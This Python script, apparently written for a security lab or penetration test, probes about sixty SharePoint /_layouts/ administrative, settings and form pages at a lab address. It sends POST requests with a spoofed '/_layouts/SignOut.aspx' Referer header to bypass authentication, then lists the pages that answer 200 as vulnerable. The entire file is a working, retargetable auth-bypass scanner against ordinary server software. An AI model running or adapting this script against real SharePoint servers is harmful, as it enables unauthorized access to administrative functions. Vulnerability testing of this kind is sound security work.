# Test additional SharePoint endpoints for auth bypass
# Purpose: Ensure comprehensive coverage of all vulnerable pages

import requests

base_url = "http://10.10.10.166"
test_body = "test=data"

headers_bypass = {
    "Referer": "/_layouts/SignOut.aspx",
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Additional SharePoint .aspx pages not tested in initial analysis
additional_pages = [
    # Administrative pages
    "aclinv.aspx", "addrole.aspx", "AdminRecycleBin.aspx", "AreaNavigationSettings.aspx",
    "AreaTemplateSettings.aspx", "AreaWelcomePage.aspx", "ChangeSiteMasterPage.aspx",
    "create.aspx", "editgrp.aspx", "editprms.aspx", "formula.aspx",
    
    # List/library pages
    "listedit.aspx", "newgrp.aspx", "pagesedit.aspx", "pagesettings.aspx",
    "recyclebin.aspx", "role.aspx", "storman.aspx", "user.aspx",
    
    # Web part pages  
    "cpglb.aspx", "gallery.aspx", "galleryproperties.aspx", "newdwp.aspx",
    "PickerDialog.aspx", "selectuser.aspx", "userdisp.aspx",
    
    # Site settings
    "mngfield.aspx", "mngctype.aspx", "mngsiteadmin.aspx", "sitemanager.aspx",
    "spcf.aspx", "SiteDirectorySettings.aspx", "themeweb.aspx", "topnav.aspx",
    "vsubwebs.aspx", "WPPicker.aspx", "wrkmng.aspx",
    
    # Mobile pages
    "mobile/mbllists.aspx", "mobile/mblwp.aspx",
    
    # Forms
    "ChangePwd.aspx", "Close.aspx", "Confirmation.aspx", "download.aspx",
    "EmailBodyText.aspx", "EmailDocLibForm.aspx", "EmailFormBody.aspx",
    
    # Search
    "osssearchresults.aspx", "searcharea.aspx", "searchresults.aspx",
    
    # Already tested but confirming
    "Error.aspx", "RedirectPage.aspx", "SPThemes.aspx", "WebPartAdder.aspx",
]

bypassed = []
blocked = []
not_found = []

for page in additional_pages:
    for prefix in ["/_layouts/15/", "/_layouts/"]:
        endpoint = f"{prefix}{page}"
        try:
            response = requests.post(f"{base_url}{endpoint}", 
                                   headers=headers_bypass, 
                                   data=test_body, 
                                   timeout=5)
            if response.status_code == 200:
                bypassed.append(endpoint)
            elif response.status_code == 401:
                blocked.append(endpoint)
            elif response.status_code == 404:
                not_found.append(endpoint)
        except requests.exceptions.Timeout:
            pass
        except Exception:
            pass

print("\n" + "=" * 60)
print("COMPREHENSIVE ENDPOINT DISCOVERY RESULTS")
print("=" * 60)

print(f"\n[+] BYPASSED (200 OK): {len(bypassed)} endpoints")
for endpoint in sorted(set(bypassed)):
    print(f"    {endpoint}")

print(f"\n[-] BLOCKED (401): {len(blocked)} endpoints")
print(f"    (Not listing all - auth is correctly enforced)")

print(f"\n[?] NOT FOUND (404): {len(not_found)} endpoints")
print(f"    (Endpoints don't exist on this server)")

# Summary
print("\n" + "=" * 60)
print("SUMMARY")
print("=" * 60)
print(f"Total vulnerable endpoints found: {len(set(bypassed))}")
